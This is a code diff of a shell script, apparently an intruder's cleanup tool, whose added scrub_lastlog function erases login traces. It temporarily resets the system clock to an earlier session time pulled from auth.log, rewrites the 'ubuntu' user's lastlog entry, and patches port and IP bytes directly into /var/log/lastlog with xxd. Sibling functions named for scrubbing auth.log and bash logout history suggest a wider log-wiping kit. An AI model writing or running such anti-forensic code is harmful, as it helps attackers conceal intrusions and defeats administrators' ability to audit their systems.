@@ -62,7 +62,26 @@ scrub_authlog()
 
 scrub_lastlog() 
 {
-	#Neeed to implement. Have idea.
+  export date=$(date) &&
+  export tmpdate=`cat /var/log/auth.log | grep "New session.*ubuntu" | tail -n2 | head -n1 -c15` &&
+  date --set="$tmpdate" &&
+  lastlog -Su ubuntu &&
+  date --set="$date" &&
+
+  tmp="$(utmpdump /var/log/wtmp | tail -n3 | head -n1)" &&
+  userport="${tmp:31:12}" &&
+  userip="${tmp:46:18}" &&
+  uphex=`echo $userport | hd | head -n1 | cut -b 11-26` &&
+  uihex=`echo $userip | hd | head -n1 | cut -b 11-58` &&
+
+  portoffset=`xxd /var/log/lastlog | grep lastlog | head -c8` &&
+  ipoffset1=`xxd /var/log/lastlog | grep localhost | head -c8` &&
+  ipoffset2=`printf '%08x\n' $(( 16#$ipoffset1 + 16 ))` &&
+  echo "$portoffset: f7 28 e3 5b $uphex 000 0000 0000" | xxd -r - /var/log/lastlog &&
+  echo "$ipoffset1: 0000 0000 ${uihex:0:23} ${uihex:25:12}" | xxd -r - /var/log/lastlog &&
+  echo "$ipoffset2: ${uihex:37:10} 00 0000 0000 0000 0000 0000 0000" | xxd -r - /var/log/lastlog
+
+  unset tmp tmpdate userport userip uphex uihex portoffset ipoffset1 ipoffset2
 }
 
 scrub_bash_logout() 
